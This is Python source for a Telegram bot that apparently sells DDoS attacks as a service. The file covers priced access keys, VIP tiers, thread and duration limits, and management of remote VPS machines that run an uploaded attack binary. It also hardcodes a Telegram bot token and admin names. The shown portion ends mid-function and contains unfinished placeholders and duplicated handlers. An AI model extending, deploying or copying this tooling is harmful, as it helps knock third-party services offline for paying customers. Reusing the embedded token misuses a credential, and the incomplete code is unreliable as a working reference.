import telebot
import datetime
import time
import subprocess
import random
import threading
import os
import ipaddress
import psutil
import paramiko
from scp import SCPClient
import json
import uuid
import sqlite3
from time import sleep

# ======================
# 🛠️ BOT CONFIGURATION
# ======================
TOKEN = '7140094105:AAGOdS2nbsUi9fgyR6-mO5fib7rLOhH7erg'
OWNER_USERNAME = "GODxAloneBOY"
ADMIN_IDS = ["GODxAloneBOY", "RAJOWNER90"]  # Add admin usernames here
ALLOWED_GROUP_IDS = [-1002658128612]
MAX_THREADS = 900
SPECIAL_MAX_THREADS = 900
VIP_MAX_THREADS = 1500
MAX_DURATION = 240
SPECIAL_MAX_DURATION = 200
VIP_MAX_DURATION = 300
ACTIVE_VPS_COUNT = 4
BINARY_PATH = "/home/master/freeroot/root/runner"
BINARY_NAME = "runner"
KEY_PRICES = {
    "10M": 5,
    "30M": 8,
    "2H": 12,
    "5H": 15,
    "1D": 20,
    "2D": 30,
    "1W": 100,
    "VIP1D": 50,
    "VIP2D": 80
}
REFERRAL_REWARD_DURATION = 120 # Hours of free attack for referrals
PUBLIC_GROUPS = []  # List of group IDs where public attacks are allowed

# ======================
# 📦 DATA STORAGE
# ======================
keys = {}
special_keys = {}
vip_keys = {}
redeemed_users = {}
redeemed_keys_info = {}
running_attacks = {}
reseller_balances = {}
instructor_notices = {}
VPS_LIST = []
REFERRAL_CODES = {}
REFERRAL_LINKS = {}
GROUP_SETTINGS = {}
last_attack_time = 0
global_cooldown = 60
# Add to DATA STORAGE section
all_users = {}  # To store all users who interact with the bot
bot_open = False

# ======================
# 🤖 BOT INITIALIZATION
# ======================
bot = telebot.TeleBot(TOKEN, threaded=True, num_threads=10)

# ======================
# 🔒 SECURE SSH CONFIGURATION
# ======================

SSH_CONFIG = {
    'timeout': 15,
    'banner_timeout': 20,
    'auth_timeout': 20,
    'look_for_keys': False,
    'allow_agent': False,
    'keepalive_interval': 15  # ADD THIS LINE
}

# ======================
# 🔧 HELPER FUNCTIONS
# ======================

def create_progress_bar(percentage):
    """Create a visual progress bar"""
    bars = "▰" * int(percentage/10)
    empty = "▱" * (10 - len(bars))
    return f"[{bars}{empty}] {percentage}%"

def check_vps_health(vps):
    """Comprehensive VPS health check"""
    health = {
        'ip': vps[0],
        'status': 'offline',
        'load': None,
        'memory': None,
        'disk': None,
        'network': False,
        'binary': False
    }
    
    ssh = None
    try:
        ssh = create_ssh_client(vps[0], vps[1], vps[2])
        health['status'] = 'online'
        
        stdin, stdout, stderr = ssh.exec_command('cat /proc/loadavg')
        health['load'] = stdout.read().decode().split()[0]
        
        stdin, stdout, stderr = ssh.exec_command('free -m | awk \'NR==2{printf "%.1f%%", $3*100/$2 }\'')
        health['memory'] = stdout.read().decode().strip()
        
        stdin, stdout, stderr = ssh.exec_command('df -h | awk \'$NF=="/"{printf "%s", $5}\'')
        health['disk'] = stdout.read().decode().strip()
        
        stdin, stdout, stderr = ssh.exec_command('ping -c 1 google.com >/dev/null 2>&1 && echo "online" || echo "offline"')
        health['network'] = 'online' in stdout.read().decode()
        
        stdin, stdout, stderr = ssh.exec_command(f'test -x {BINARY_PATH} && echo "exists" || echo "missing"')
        health['binary'] = 'exists' in stdout.read().decode()
        
    except Exception as e:
        health['error'] = str(e)
    finally:
        if ssh:
            ssh.close()
    
    return health

def show_vps_status(message):
    """Show detailed VPS status"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "⛔ Only owner can check VPS status!")
        return
    
    msg = bot.send_message(message.chat.id, "🔄 Checking VPS status...")
    
    status_messages = []
    for i, vps in enumerate(VPS_LIST):
        health = check_vps_health(vps)
        
        status_msg = f"""
🔹 VPS {i+1} - {vps[0]}
├ Status: {'🟢 Online' if health['status'] == 'online' else '🔴 Offline'}
├ Load: {health.get('load', 'N/A')}
├ Memory: {health.get('memory', 'N/A')}
├ Disk: {health.get('disk', 'N/A')}
├ Network: {'✅' if health.get('network') else '❌'}
└ Binary: {'✅' if health.get('binary') else '❌'}
"""
        if 'error' in health:
            status_msg += f"└ Error: {health['error']}\n"
        
        status_messages.append(status_msg)
    
    full_message = "📊 VPS STATUS REPORT\n\n" + "\n".join(status_messages)
    
    try:
        bot.edit_message_text(full_message, message.chat.id, msg.message_id)
    except:
        bot.send_message(message.chat.id, full_message)
        
def get_vps_load(vps):
    """Get current load of a VPS"""
    try:
        ssh = create_ssh_client(vps[0], vps[1], vps[2])
        stdin, stdout, stderr = ssh.exec_command('cat /proc/loadavg')
        load = stdout.read().decode().split()[0]
        ssh.close()
        return float(load)
    except:
        return float('inf')

def select_optimal_vps(vps_list, required_threads):
    """Select best VPS based on current load"""
    available_vps = []
    busy_vps = [attack['vps_ip'] for attack in running_attacks.values() if 'vps_ip' in attack]
    
    for vps in vps_list:
        # Skip invalid VPS configurations
        if len(vps) < 3:
            continue
            
        if vps[0] not in busy_vps:
            try:
                load = get_vps_load(vps)
                available_vps.append((vps, load))
            except:
                continue
    
    if not available_vps:
        return []
    
    available_vps.sort(key=lambda x: x[1])
    base_threads = required_threads // len(available_vps)
    vps_distribution = []
    
    for vps, load in available_vps:
        threads = base_threads
        vps_distribution.append((vps, threads))
        required_threads -= threads
    
    i = 0
    while required_threads > 0:
        vps_distribution[i] = (vps_distribution[i][0], vps_distribution[i][1] + 1)
        required_threads -= 1
        i = (i + 1) % len(vps_distribution)
    
    return vps_distribution
            
def handle_notice_confirmation(call):
    # ... existing code ...
    
    # Send to all users who ever interacted
    for uid in all_users:
        send_notice(uid)
        time.sleep(0.1)
    
def is_allowed_group(message):
    return message.chat.id in ALLOWED_GROUP_IDS or message.chat.type == "private"

def is_owner(user):
    return user.username == OWNER_USERNAME

def is_admin(user):
    return user.username in ADMIN_IDS or is_owner(user)

def is_authorized_user(user):
    user_id = str(user.id)
    
    # Check if user is banned
    if 'banned_users' in globals() and user_id in banned_users:
        return False
        
    # Check if admin
    if is_admin(user):
        return True
        
    # Check if user has a valid key
    if user_id in redeemed_users:
        user_data = redeemed_users[user_id]
        # Handle both old format (just expiration_time) and new format (dictionary)
        if isinstance(user_data, dict):
            expiration_time = user_data.get('expiration_time', 0)
        else:
            expiration_time = user_data  # old format where value was just expiration_time
            
        if time.time() < expiration_time:
            return True
        else:
            # Remove expired user
            del redeemed_users[user_id]
            save_data()
            
    return False

def cleanup_expired_users():
    current_time = time.time()
    expired_users = []
    
    for user_id, user_data in redeemed_users.items():
        if isinstance(user_data, dict):
            expiration_time = user_data.get('expiration_time', 0)
        else:
            expiration_time = user_data
            
        if current_time > expiration_time:
            expired_users.append(user_id)
    
    for user_id in expired_users:
        del redeemed_users[user_id]
    
    if expired_users:
        save_data()
        
def get_display_name(user):
    return f"@{user.username}" if user.username else user.first_name

def save_data():
    """Save all bot data to JSON files"""
    with open('keys.json', 'w') as f:
        json.dump({
            'all_users': all_users,
            'keys': keys,
            'special_keys': special_keys,
            'vip_keys': vip_keys,
            'redeemed_users': redeemed_users,
            'redeemed_keys_info': redeemed_keys_info,
            'referral_codes': REFERRAL_CODES,
            'referral_links': REFERRAL_LINKS,
            'group_settings': GROUP_SETTINGS,
            'public_groups': PUBLIC_GROUPS,  # Add to save_data()
            'banned_users': banned_users if 'banned_users' in globals() else {},
            'vps_list': VPS_LIST,  # Add this line
            'thread_settings': {
                'MAX_THREADS': MAX_THREADS,
                'SPECIAL_MAX_THREADS': SPECIAL_MAX_THREADS,
                'VIP_MAX_THREADS': VIP_MAX_THREADS,
                'MAX_DURATION': MAX_DURATION,
                'SPECIAL_MAX_DURATION': SPECIAL_MAX_DURATION,
                'VIP_MAX_DURATION': VIP_MAX_DURATION
                
            }
        }, f)
    # ... rest of the function ...

def load_data():
    """Load all bot data from JSON files"""
    global keys, special_keys, vip_keys, redeemed_users, redeemed_keys_info, VPS_LIST, REFERRAL_CODES, REFERRAL_LINKS, GROUP_SETTINGS
    global MAX_THREADS, SPECIAL_MAX_THREADS, VIP_MAX_THREADS, MAX_DURATION, SPECIAL_MAX_DURATION, VIP_MAX_DURATION
    global all_users

    if os.path.exists('keys.json'):
        with open('keys.json', 'r') as f:
            data = json.load(f)
            keys = data.get('keys', {})
            special_keys = data.get('special_keys', {})
            vip_keys = data.get('vip_keys', {})
            redeemed_users = data.get('redeemed_users', {})
            redeemed_keys_info = data.get('redeemed_keys_info', {})
            REFERRAL_CODES = data.get('referral_codes', {})
            REFERRAL_LINKS = data.get('referral_links', {})
            GROUP_SETTINGS = data.get('group_settings', {})
            all_users = data.get('all_users', {})
            VPS_LIST = data.get('vps_list', [])  # Add this line
            PUBLIC_GROUPS = data.get('public_groups', [])  # Add to load_data()
            banned_users = data.get('banned_users', {})
            
            # Load thread settings
            thread_settings = data.get('thread_settings', {})
            MAX_THREADS = thread_settings.get('MAX_THREADS', 500)
            SPECIAL_MAX_THREADS = thread_settings.get('SPECIAL_MAX_THREADS', 900)
            VIP_MAX_THREADS = thread_settings.get('VIP_MAX_THREADS', 1500)
            MAX_DURATION = thread_settings.get('MAX_DURATION', 240)
            SPECIAL_MAX_DURATION = thread_settings.get('SPECIAL_MAX_DURATION', 200)
            VIP_MAX_DURATION = thread_settings.get('VIP_MAX_DURATION', 300)

def save_admins():
    """Save admin list to file"""
    with open('admins.json', 'w') as f:
        json.dump(ADMIN_IDS, f)

def load_admins():
    """Load admin list from file"""
    global ADMIN_IDS
    if os.path.exists('admins.json'):
        with open('admins.json', 'r') as f:
            ADMIN_IDS = json.load(f)

def create_ssh_client(ip, username, password):
    """Create a secure SSH client with proper configuration"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.WarningPolicy())
    ssh.load_system_host_keys()
    
    try:
        ssh.connect(
            hostname=ip,
            username=username,
            password=password,
            **SSH_CONFIG
        )
        transport = ssh.get_transport()
        transport.set_keepalive(SSH_CONFIG['keepalive_interval'])
        return ssh
    except Exception as e:
        raise Exception(f"SSH Connection failed: {str(e)}")

def secure_scp_transfer(ssh, local_path, remote_path):
    """Secure file transfer with SCP"""
    try:
        with SCPClient(ssh.get_transport(), socket_timeout=30) as scp:
            scp.put(local_path, remote_path)
        return True
    except Exception as e:
        raise Exception(f"SCP Transfer failed: {str(e)}")
        
# ======================
# ⌨️ KEYBOARD MARKUPS (STYLISH VERSION)
# ======================
def create_main_keyboard(message=None):
    """Create main menu keyboard with stylish fonts"""
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=False)

    # Common buttons
    buttons = [
        telebot.types.KeyboardButton("🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙇𝘼𝙐𝙉𝘾𝙃"),
        telebot.types.KeyboardButton("🔑 𝙍𝙀𝘿𝙀𝙀𝙈 𝙆𝙀𝙔"),
        telebot.types.KeyboardButton("🎁 𝗥𝗘𝗙𝗙𝗘𝗥𝗔𝗟"),
        telebot.types.KeyboardButton("🍅 𝙋𝙍𝙊𝙓𝙔 𝙎𝙏𝘼𝙏𝙐𝙎"),
        telebot.types.KeyboardButton("🛑 𝙎𝙏𝙊𝙋 𝘼𝙏𝙏𝘼𝘾𝙆")
    ]

    user_id = str(message.from_user.id) if message else None
    if user_id in redeemed_users and isinstance(redeemed_users[user_id], dict):
        if redeemed_users[user_id].get('is_vip'):
            buttons.insert(1, telebot.types.KeyboardButton("🔥 𝙑𝙄𝙋 𝘼𝙏𝙏𝘼𝘾𝙆"))

    markup.add(*buttons)

    if message:
        if is_owner(message.from_user):
            admin_buttons = [
                telebot.types.KeyboardButton("🔐 𝙆𝙀𝙔 𝙈𝘼𝙉𝘼𝙂𝙀𝙍"),
                telebot.types.KeyboardButton("🖥️ 𝙑𝙋𝙎 𝙈𝘼𝙉𝘼𝙂𝙀𝙍"),
                telebot.types.KeyboardButton("⚙️ 𝙏𝙃𝙍𝙀𝘼𝘿 𝙎𝙀𝙏𝙏𝙄𝙉𝙂𝙎"),
                telebot.types.KeyboardButton("👥 𝙂𝙍𝙊𝙐𝙋 𝙈𝘼𝙉𝘼𝙂𝙀𝙍"),
                telebot.types.KeyboardButton("📢 𝘽𝙍𝙊𝘿𝘾𝘼𝙎𝙏"),
                telebot.types.KeyboardButton("🖼️ 𝙎𝙀𝙏 𝙎𝙏𝘼𝙍𝙏 𝙄𝙈𝘼𝙂𝙀"),
                telebot.types.KeyboardButton("📝 𝙎𝙀𝙏 𝙊𝙒𝙉𝙀𝙍 𝙉𝘼𝙈𝙀")
            ]
            markup.add(*admin_buttons)
        elif is_admin(message.from_user):
            limited_buttons = [
                telebot.types.KeyboardButton("🔐 𝙆𝙀𝙔 𝙈𝘼𝙉𝘼𝙂𝙀𝙍"),
                telebot.types.KeyboardButton("👥 𝙂𝙍𝙊𝙐𝙋 𝙈𝘼𝙉𝘼𝙂𝙀𝙍"),
                telebot.types.KeyboardButton("🖼️ 𝙎𝙀𝙏 𝙎𝙏𝘼𝙍𝙏 𝙄𝙈𝘼𝙂𝙀"),
                telebot.types.KeyboardButton("📝 𝙎𝙀𝙏 𝙊𝙒𝙉𝙀𝙍 𝙉𝘼𝙈𝙀")
            ]
            markup.add(*limited_buttons)

    return markup

def create_key_management_keyboard():
    """Create stylish keyboard for key management"""
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        telebot.types.KeyboardButton("🔓 𝙂𝙀𝙉𝙍𝘼𝙏𝙀 𝙆𝙀𝙔"),
        telebot.types.KeyboardButton("📋 𝙆𝙀𝙔 𝙇𝙄𝙎𝙏"),
        telebot.types.KeyboardButton("🗑️ 𝘿𝙀𝙇𝙀𝙏𝙀 𝙆𝙀𝙔"),
        telebot.types.KeyboardButton("🔙 𝙈𝘼𝙄𝙉 𝙈𝙀𝙉𝙐")
    ]
    markup.add(*buttons)
    return markup
    
def create_vip_keyboard():
    """Create VIP menu keyboard with premium styling"""
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        telebot.types.KeyboardButton("🔥 𝙑𝙄𝙋 𝘼𝙏𝙏𝘼𝘾𝙆"),
        telebot.types.KeyboardButton("🔑 𝙍𝙀𝘿𝙀𝙀𝙈 𝙆𝙀𝙔"),
        telebot.types.KeyboardButton("🍅 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙏𝙐𝙎"),
        telebot.types.KeyboardButton("🎁 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘 𝗥𝗘𝗙𝗙𝗘𝗥𝗔𝗟"),
        telebot.types.KeyboardButton("🍁 𝙑𝙄𝙋 𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉")
    ]
    markup.add(*buttons)
    return markup    

def create_vps_management_keyboard():
    """Create VPS management keyboard with tech style"""
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        telebot.types.KeyboardButton("🖥️ 𝙑𝙋𝙎 𝙎𝙏𝘼𝙏𝙐𝙎"),
        telebot.types.KeyboardButton("🏥 𝙑𝙋𝙎 𝙃𝙀𝘼𝙇𝙏𝙃"),
        telebot.types.KeyboardButton("⚡ 𝘽𝙊𝙊𝙎𝙏 𝙑𝙋𝙎 (𝙎𝘼𝙁𝙀)"),
        telebot.types.KeyboardButton("➕ 𝘼𝘿𝘿 𝙑𝙋𝙎"),
        telebot.types.KeyboardButton("➖ 𝙍𝙀𝙈𝙊𝙑𝙀 𝙑𝙋𝙎"),
        telebot.types.KeyboardButton("📤 𝙐𝙋𝙇𝙊𝘼𝘿 𝘽𝙄𝙉𝘼𝙍𝙔"),
        telebot.types.KeyboardButton("🗑️ 𝘿𝙀𝙇𝙀𝙏𝙀 𝘽𝙄𝙉𝘼𝙍𝙔"),
        telebot.types.KeyboardButton("🔙 𝙈𝘼𝙄𝙉 𝙈𝙀𝙉𝙐")
    ]
    markup.add(*buttons)
    return markup

def create_group_management_keyboard():
    """Create stylish group management keyboard"""
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        telebot.types.KeyboardButton("➕ 𝘼𝘿𝘿 𝘼𝘿𝙈𝙄𝙉"),
        telebot.types.KeyboardButton("➖ 𝙍𝙀𝙈𝙊𝙑𝙀 𝘼𝘿𝙈𝙄𝙉"),
        telebot.types.KeyboardButton("📋 𝗔𝗗𝗠𝗜𝗡 𝗟𝗜𝗦𝗧"),
        telebot.types.KeyboardButton("🌐 𝘼𝘾𝙏𝙄𝙑𝘼𝙏𝙀 𝙋𝙐𝘽𝙇𝙄𝘾"),
        telebot.types.KeyboardButton("❌ 𝘿𝙀𝘼𝘾𝙏𝙄𝙑𝘼𝙏𝙀 𝙋𝙐𝘽𝙇𝙄𝘾"),
        telebot.types.KeyboardButton("👥 𝘼𝘿𝘿 𝙂𝙍𝙊𝙐𝙋"),
        telebot.types.KeyboardButton("👥 𝙍𝙀𝙈𝙊𝙑𝙀 𝙂𝙍𝙊𝙐𝙋"),
        telebot.types.KeyboardButton("🔨 𝘽𝘼𝙉 𝙐𝙎𝙀𝙍"),
        telebot.types.KeyboardButton("😅 𝗔𝗟𝗟 𝙐𝙎𝙀𝙍𝙎"),
        telebot.types.KeyboardButton("🔓 𝙐𝙉𝘽𝘼𝙉 𝙐𝙎𝙀𝙍"),  # Added unban button
        telebot.types.KeyboardButton("🔙 𝙈𝘼𝙄𝙉 𝙈𝙀𝙉𝙐")
    ]
    markup.add(*buttons)
    return markup

# Option 1: Update the keyboard creation function (recommended)
def create_thread_settings_keyboard():
    """Create keyboard for thread settings management"""
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        telebot.types.KeyboardButton("🧵 SET NORMAL THREADS"),
        telebot.types.KeyboardButton("⚡ SET SPECIAL THREADS"),
        telebot.types.KeyboardButton("💎 SET VIP THREADS"),
        telebot.types.KeyboardButton("📊 VIEW THREAD SETTINGS"),
        telebot.types.KeyboardButton("🔙 𝙈𝘼𝙄𝙉 𝙈𝙀𝙉𝙐")  # Changed to match the handler
    ]
    markup.add(*buttons)
    return markup

# OR Option 2: Add an additional handler (alternative solution)
@bot.message_handler(func=lambda msg: msg.text in ["🔙 𝙈𝘼𝙄𝙉 𝙈𝙀𝙉𝙐", "⬅️ 𝗕𝗮𝗰𝗸", "MAIN MENU"])  # Added "MAIN MENU"
def back_to_main_menu(message):
    """Return user to main menu with stylish message"""
    bot.send_message(
        message.chat.id, 
        "🏠 𝗥𝗲𝘁𝘂𝗿𝗻𝗶𝗻𝗴 𝘁𝗼 𝗺𝗮𝗶𝗻 𝗺𝗲𝗻𝘂...",
        reply_markup=create_main_keyboard(message)
    )

# ======================
# 🔙 BACK TO MAIN MENU
# ======================    
@bot.message_handler(func=lambda msg: msg.text in ["🔙 𝙈𝘼𝙄𝙉 𝙈𝙀𝙉𝙐", "⬅️ 𝗕𝗮𝗰𝗸"])
def back_to_main_menu(message):
    """Return user to main menu with stylish message"""
    bot.send_message(
        message.chat.id, 
        "🏠 𝗥𝗲𝘁𝘂𝗿𝗻𝗶𝗻𝗴 𝘁𝗼 𝗺𝗮𝗶𝗻 𝗺𝗲𝗻𝘂...",
        reply_markup=create_main_keyboard(message)
    )    

# ======================
# 🔐 ADMIN MENU HANDLERS (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "🔐 𝙆𝙀𝙔 𝙈𝘼𝙉𝘼𝙂𝙀𝙍")
def key_management_menu(message):
    """Handle key management menu access with premium styling"""
    if not is_admin(message.from_user):
        bot.reply_to(message, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗱𝗲𝗻𝗶𝗲𝗱!")
        return
    bot.send_message(
        message.chat.id,
        "🔑 𝗞𝗲𝘆 𝗠𝗮𝗻𝗮𝗴𝗲𝗺𝗲𝗻𝘁 𝗣𝗮𝗻𝗲𝗹 - 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗼𝗽𝘁𝗶𝗼𝗻:",
        reply_markup=create_key_management_keyboard()
    )

@bot.message_handler(func=lambda msg: msg.text == "👥 𝙂𝙍𝙊𝙐𝙋 𝙈𝘼𝙉𝘼𝙂𝙀𝙍")
def group_management_menu(message):
    """Handle group management menu access with premium styling"""
    if not is_admin(message.from_user):
        bot.reply_to(message, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗱𝗲𝗻𝗶𝗲𝗱!")
        return
    bot.send_message(
        message.chat.id,
        "👥 𝗚𝗿𝗼𝘂𝗽 𝗠𝗮𝗻𝗮𝗴𝗲𝗺𝗲𝗻𝘁 𝗣𝗮𝗻𝗲𝗹 - 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗼𝗽𝘁𝗶𝗼𝗻:",
        reply_markup=create_group_management_keyboard()
    )

@bot.message_handler(func=lambda msg: msg.text == "🖥️ 𝙑𝙋𝙎 𝙈𝘼𝙉𝘼𝙂𝙀𝙍")
def vps_management_menu(message):
    """Handle VPS management menu access with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗱𝗲𝗻𝗶𝗲𝗱!")
        return
    bot.send_message(
        message.chat.id, 
        "🖥️ 𝗩𝗣𝗦 𝗠𝗮𝗻𝗮𝗴𝗲𝗺𝗲𝗻𝘁 𝗣𝗮𝗻𝗲𝗹 - 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗼𝗽𝘁𝗶𝗼𝗻:",
        reply_markup=create_vps_management_keyboard()
    )

# ======================
# 🖼️ GROUP SETTINGS (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "🖼️ 𝙎𝙀𝙏 𝙎𝙏𝘼𝙍𝙏 𝙄𝙈𝘼𝙂𝙀")
def set_start_image(message):
    """Set start image for a group with stylish interface"""
    if not is_admin(message.from_user):
        bot.reply_to(message, "⛔ 𝗢𝗻𝗹𝘆 𝗮𝗱𝗺𝗶𝗻𝘀 𝗰𝗮𝗻 𝘀𝗲𝘁 𝘁𝗵𝗲 𝘀𝘁𝗮𝗿𝘁 𝗶𝗺𝗮𝗴𝗲!")
        return
        
    # Create keyboard with allowed groups
    markup = telebot.types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    for group_id in ALLOWED_GROUP_IDS:
        try:
            chat = bot.get_chat(group_id)
            markup.add(telebot.types.KeyboardButton(f"🖼️ {chat.title}"))
        except:
            continue
    markup.add(telebot.types.KeyboardButton("❌ 𝗖𝗮𝗻𝗰𝗲𝗹"))
    
    bot.reply_to(message, "𝗦𝗲𝗹𝗲𝗰𝘁 𝗮 𝗴𝗿𝗼𝘂𝗽 𝘁𝗼 𝘀𝗲𝘁 𝘀𝘁𝗮𝗿𝘁 𝗶𝗺𝗮𝗴𝗲 𝗳𝗼𝗿:", reply_markup=markup)
    bot.register_next_step_handler(message, process_group_for_image)

def process_group_for_image(message):
    """Process group selection for image setting with stylish interface"""
    if message.text == "❌ 𝗖𝗮𝗻𝗰𝗲𝗹":
        bot.reply_to(message, "𝗜𝗺𝗮𝗴𝗲 𝘀𝗲𝘁𝘁𝗶𝗻𝗴 𝗰𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱.", reply_markup=create_main_keyboard(message))
        return

    selected_title = message.text[2:].strip().lower()  # Remove prefix & normalize
    selected_group = None

    for group_id in ALLOWED_GROUP_IDS:
        try:
            chat = bot.get_chat(group_id)
            if selected_title in chat.title.strip().lower():  # Partial and case-insensitive match
                selected_group = group_id
                break
        except Exception as e:
            print(f"[ERROR] Could not get chat info for group {group_id}: {e}")

    if not selected_group:
        bot.reply_to(message, "❌ 𝗚𝗿𝗼𝘂𝗽 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱!", reply_markup=create_main_keyboard(message))
        return

    bot.reply_to(message, "📷 𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝘁𝗵𝗲 𝗶𝗺𝗮𝗴𝗲 𝘆𝗼𝘂 𝘄𝗮𝗻𝘁 𝘁𝗼 𝘀𝗲𝘁 𝗮𝘀 𝘁𝗵𝗲 𝘀𝘁𝗮𝗿𝘁 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝗶𝗺𝗮𝗴𝗲:")
    bot.register_next_step_handler(message, lambda msg: process_start_image(msg, selected_group))

def process_start_image(message, group_id):
    """Process the image and save it for the group with stylish confirmation"""
    if not message.photo:
        bot.reply_to(message, "❌ 𝗧𝗵𝗮𝘁'𝘀 𝗻𝗼𝘁 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲! 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻.")
        return
        
    # Initialize group settings if not exists
    if str(group_id) not in GROUP_SETTINGS:
        GROUP_SETTINGS[str(group_id)] = {}
        
    # Get the highest resolution photo
    GROUP_SETTINGS[str(group_id)]['start_image'] = message.photo[-1].file_id
    save_data()
    
    try:
        chat = bot.get_chat(group_id)
        bot.reply_to(message, f"✅ 𝗦𝘁𝗮𝗿𝘁 𝗶𝗺𝗮𝗴𝗲 𝘀𝗲𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗳𝗼𝗿 𝗴𝗿𝗼𝘂𝗽: {chat.title}")
    except:
        bot.reply_to(message, "✅ 𝗦𝘁𝗮𝗿𝘁 𝗶𝗺𝗮𝗴𝗲 𝘀𝗲𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!")

@bot.message_handler(func=lambda msg: msg.text == "📝 𝙎𝙀𝙏 𝙊𝙒𝙉𝙀𝙍 𝙉𝘼𝙈𝙀")
def set_owner_name(message):
    """Set owner name for a group with stylish interface"""
    if not is_admin(message.from_user):
        bot.reply_to(message, "⛔ 𝗢𝗻𝗹𝘆 𝗮𝗱𝗺𝗶𝗻𝘀 𝗰𝗮𝗻 𝘀𝗲𝘁 𝘁𝗵𝗲 𝗼𝘄𝗻𝗲𝗿 𝗻𝗮𝗺𝗲!")
        return
        
    # Create keyboard with allowed groups
    markup = telebot.types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    for group_id in ALLOWED_GROUP_IDS:
        try:
            chat = bot.get_chat(group_id)
            markup.add(telebot.types.KeyboardButton(f"👑 {chat.title}"))
        except:
            continue
    markup.add(telebot.types.KeyboardButton("❌ 𝗖𝗮𝗻𝗰𝗲𝗹"))
    
    bot.reply_to(message, "𝗦𝗲𝗹𝗲𝗰𝘁 𝗮 𝗴𝗿𝗼𝘂𝗽 𝘁𝗼 𝘀𝗲𝘁 𝗼𝘄𝗻𝗲𝗿 𝗻𝗮𝗺𝗲 𝗳𝗼𝗿:", reply_markup=markup)
    bot.register_next_step_handler(message, process_group_for_owner_name)

def process_group_for_owner_name(message):
    """Process group selection for owner name setting with stylish interface"""
    if message.text == "❌ 𝗖𝗮𝗻𝗰𝗲𝗹":
        bot.reply_to(message, "𝗢𝘄𝗻𝗲𝗿 𝗻𝗮𝗺𝗲 𝘀𝗲𝘁𝘁𝗶𝗻𝗴 𝗰𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱.", reply_markup=create_main_keyboard(message))
        return
    
    selected_title = message.text[2:]  # Remove the 👑 prefix
    selected_group = None
    
    for group_id in ALLOWED_GROUP_IDS:
        try:
            chat = bot.get_chat(group_id)
            if chat.title == selected_title:
                selected_group = group_id
                break
        except:
            continue
    
    if not selected_group:
        bot.reply_to(message, "❌ 𝗚𝗿𝗼𝘂𝗽 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱!", reply_markup=create_main_keyboard(message))
        return
    
    bot.reply_to(message, "📝 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗻𝗲𝘄 𝗼𝘄𝗻𝗲𝗿 𝗻𝗮𝗺𝗲 𝗳𝗼𝗿 𝘁𝗵𝗶𝘀 𝗴𝗿𝗼𝘂𝗽:")
    bot.register_next_step_handler(message, lambda msg: process_owner_name(msg, selected_group))

def process_owner_name(message, group_id):
    """Process and save the new owner name with stylish confirmation"""
    if not message.text or len(message.text) > 32:
        bot.reply_to(message, "❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝗮𝗺𝗲! 𝗠𝘂𝘀𝘁 𝗯𝗲 𝟭-𝟯𝟮 𝗰𝗵𝗮𝗿𝗮𝗰𝘁𝗲𝗿𝘀.")
        return
        
    # Initialize group settings if not exists
    if str(group_id) not in GROUP_SETTINGS:
        GROUP_SETTINGS[str(group_id)] = {}
        
    GROUP_SETTINGS[str(group_id)]['owner_name'] = message.text
    save_data()
    
    try:
        chat = bot.get_chat(group_id)
        bot.reply_to(message, f"✅ 𝗢𝘄𝗻𝗲𝗿 𝗻𝗮𝗺𝗲 𝘀𝗲𝘁 𝘁𝗼: {message.text} 𝗳𝗼𝗿 𝗴𝗿𝗼𝘂𝗽: {chat.title}")
    except:
        bot.reply_to(message, f"✅ 𝗢𝘄𝗻𝗲𝗿 𝗻𝗮𝗺𝗲 𝘀𝗲𝘁 𝘁𝗼: {message.text}")

# ======================
# 🏠 WELCOME MESSAGE (STYLISH VERSION)
# ======================
@bot.message_handler(commands=['start'])
def welcome(message):
    """Handle /start command with premium styling and user tracking"""
    # Track all users who interact with the bot
    user_id = str(message.from_user.id)
    user = message.from_user
    
    # Initialize all_users dictionary if not exists
    if 'all_users' not in globals():
        global all_users
        all_users = {}
    
    # Add/update user in tracking
    all_users[user_id] = {
        'first_seen': time.time(),
        'username': user.username,
        'first_name': user.first_name,
        'last_name': user.last_name if user.last_name else "",
        'last_active': time.time(),
        'is_admin': is_admin(user),
        'is_owner': is_owner(user),
